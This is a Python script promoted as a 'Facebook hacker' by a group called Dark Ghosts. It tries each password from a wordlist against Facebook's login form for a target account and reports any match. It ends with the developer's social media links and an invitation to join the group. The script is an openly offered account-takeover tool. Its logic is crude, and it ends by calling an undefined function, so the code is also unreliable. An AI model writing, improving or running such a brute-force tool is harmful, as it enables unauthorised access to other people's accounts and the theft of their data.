import os
import requests
from bs4 import BeautifulSoup
os.system('clear')
o = '\033[0;33m'
v = '\033[0;34m'
f = '\033[0;32m'
c = '\033[0;32m'
b = '\033[0;33m'
n = '\033[0;37m'
r = '\033[0;31m'
g = '\033[0;104m'

def check_facebook_link(url):
    response = requests.get(url)
    if response.status_code == 200:
        if 'facebook.com' in response.url:
            print(f"{v}[*]{n}The Facebook link has been verified")
            import time
            time.sleep(2)
            print(f"{v}[*]{n}Loading........")
            start_time = time.time()
            time.sleep(5)
            print(f"{o}Press{r} CTRL{o}+Cto quit")
            time.sleep(1)
            return True
    else:
        print(f"{o}[!]{n}The link I entered is {r}incorrect{n}")
        return False

def guess_password(password_file, target_url):
    if not check_facebook_link(target_url):
        return

    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()

    for password in passwords:
        session = requests.Session()
        login_url = "https://www.facebook.com/login.php"

        # الحصول على صفحة تسجيل الدخول للحصول على معلومات الجلسة
        login_page = session.get(login_url)
        soup = BeautifulSoup(login_page.content, 'html.parser')
        inputs = soup.find_all('input')

        payload = {}
        for input_elem in inputs:
            if input_elem.has_attr('value'):
                payload[input_elem['name']] = input_elem['value']

        # تحديث بيانات تسجيل الدخول بكلمة المرور المحاولة
        payload['email'] = 'target_email@example.com'
        payload['pass'] = password

        # إرسال طلب POST لتسجيل الدخول باستخدام كلمة المرور المحاولة
        login_response = session.post(login_url, data=payload)

        # التحقق من نجاح تسجيل الدخول عن طريق التحقق من وجود عنصر مميز في الصفحة بعد تسجيل الدخول
        if 'username' in login_response.text:
            # التحقق من أنه لا يوجد عنصر خطأ في الصفحة
            if 'error' not in login_response.text:
                print(f"{c}[*]{n}Password has been guessed successfully{c}{password}{n}  ")
                return
            else:
                print(f"{o}[!]{n}An{r} error{n} occurred during login ")
                return

        # عرض عملية التخمين على الشاشة
        print(f"{o}[!]{n}Guessing the {o}password{c}  {password}{n}")

    print(f"{o}[!]{r}Password{n} guessing failed{o}[!]")

def aridji():
    os.system('clear')
    print(f'''{v}
   _______  _______  _______  _______  ______   _______  _______  _         
(  ____ \(  ___  )(  ____ \(  ____ \(  ___ \ (  ___  )(  ___  )| \    /\  
| (    \/| (   ) || (    \/| (    \/| (   ) )| (   ) || (   ) ||  \  / /  
| (__    | (___) || |      | (__    | (__/ / | |   | || |   | ||  (_/ /   
|  __)   |  ___  || |      |  __)   |  __ (  | |   | || |   | ||   _ (    
| (      | (   ) || |      | (      | (  \ \ | |   | || |   | ||  ( \ \   
| )      | )   ( || (____/\| (____/\| )___) )| (___) || (___) ||  /  \ \  
|/       |/     \|(_______/(_______/|/ \___/ (_______)(_______)|_/    \/  
{g}Facebook hacker{n}

{o}[!]{n}You can enter any guess file you want. You can search on {o}YouTube {n}for how to make a guess file in {o}txt  {n}  You can use my guess file {o}(password.txt){n}Make sure that {o}WiFi{n}{c} and a data hotspot{n} are on so that the tool works with you without {r}errors{n}  ''')
    password_file = input(f"{n}Please enter the path of the {o}password.txt{r} file{n} : ")
    target_url = input(f"{n}Please enter a target {o}Facebook{r} link{n} : ")
    guess_password(password_file, target_url)

def aymen():
    import time
    print(f"{v}[*]{n} Loading.......")
    start_time = time.time()
    time.sleep(5)
    print(f"{v}[*]{n} Uploaded successfully{o}!{n}")
    print(f'''
    Hello, I am a developer, and here is some information about me:

    Country: {o}Algeria{n}
    City: {o}Annaba{n}
    Age: {o}22{n}
    Name: {o}AYMEN{n}
    Organization name: {o}Dark Ghosts{n}
    If you are interested in joining the organization, contact me.
    These are some of my social media accounts if you want to reach out:
    Facebook: {o}https://www.facebook.com/profile.php?id=100067567612149{n}
    Telegram: {o}@AYMENDZF{n}
    GitHub: {o}https://github.com/AymenDz001{n}
    Telegram Group: {o}https://t.me/+BuF6cBK4_TQzOGY0{n}
    Youtube:{o}https://www.youtube.com/@DarkGhosts-dz
    ''')

print(f'''{v}
 _______  _______  _______  _______  ______   _______  _______  _         
(  ____ \(  ___  )(  ____ \(  ____ \(  ___ \ (  ___  )(  ___  )| \    /\  
| (    \/| (   ) || (    \/| (    \/| (   ) )| (   ) || (   ) ||  \  / /  
| (__    | (___) || |      | (__    | (__/ / | |   | || |   | ||  (_/ /   
|  __)   |  ___  || |      |  __)   |  __ (  | |   | || |   | ||   _ (    
| (      | (   ) || |      | (      | (  \ \ | |   | || |   | ||  ( \ \   
| )      | )   ( || (____/\| (____/\| )___) )| (___) || (___) ||  /  \ \  
|/       |/     \|(_______/(_______/|/ \___/ (_______)(_______)|_/    \/  
{g}Facebook hacker{n}

{o}Youtube: https://www.youtube.com/@DarkGhosts-dz''')
print(f'''{o}
algeria{r}
 _____ __ __ _____ _____ _____
|  _  |  |  |     |   __|   | |
|     |_   _| | | |   __| | | |
|__|__| |_| |_|_|_|_____|_|___|

{n}This is a tool that belongs to the {o}Dark Ghosts{n} organization''')
print(f"{o}[1]{n}------Make a guess on the Facebook password")
print(f"{o}[2]{n}------Communicate with me")
print('\n')

chinput = input(f"{o}[?]{n}(Choose {r}number{n}): ")

if chinput == '1':
    aridji()
if chinput == '2':
    aymen()


men()


